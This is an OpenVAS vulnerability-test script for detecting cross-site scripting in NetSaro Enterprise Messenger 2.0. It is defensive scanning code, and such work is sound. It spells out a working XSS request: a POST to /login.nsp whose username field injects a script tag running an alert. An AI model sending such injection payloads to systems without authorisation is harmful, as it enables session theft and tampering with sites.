###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netsaro_49390.nasl 13 2013-10-27 12:16:33Z jan $
#
# NetSaro Enterprise Messenger Cross Site Scripting and HTML Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "NetSaro Enterprise Messenger is prone to multiple cross-site
scripting and HTML-injection vulnerabilities because it fails to
properly sanitize user-supplied input before using it in dynamically
generated content.

Successful exploits will allow attacker-supplied HTML and script
code to run in the context of the affected browser, potentially
allowing the attacker to steal cookie-based authentication
credentials or to control how the site is rendered to the user.
Other attacks are also possible.

NetSaro Enterprise Messenger 2.0 is vulnerable; other versions may
also be affected.";


if (description)
{
 script_id(103236);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-09-01 14:04:12 +0200 (Thu, 01 Sep 2011)");
 script_bugtraq_id(49390);
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
 script_name("NetSaro Enterprise Messenger Cross Site Scripting and HTML Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49390");
 script_xref(name : "URL" , value : "http://www.netsaro.com/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed NetSaro Enterprise Messenger is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 4990);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:4990);
if(!get_port_state(port))exit(0);

sndReq = http_get(item:"/", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if("<title>NetSaro Administration Console</title>" >!< rcvRes)exit(0);

req = string("POST /login.nsp HTTP/1.1\r\n",
	     "Host: ", get_host_name(),"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Content-Length: 131\r\n",
	     "\r\n",
	     "username=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28%22openvas-xss-test%22%29%3C%2Fscript%3E&password=&login=Log+In&postback=postback\r\n",
	     "\r\n");

rcvRes = http_keepalive_send_recv(port:port, data:req);

if('"></script><script>alert("openvas-xss-test")</script>"' >< rcvRes)  {

  security_warning(port:port);
  exit(0);

}  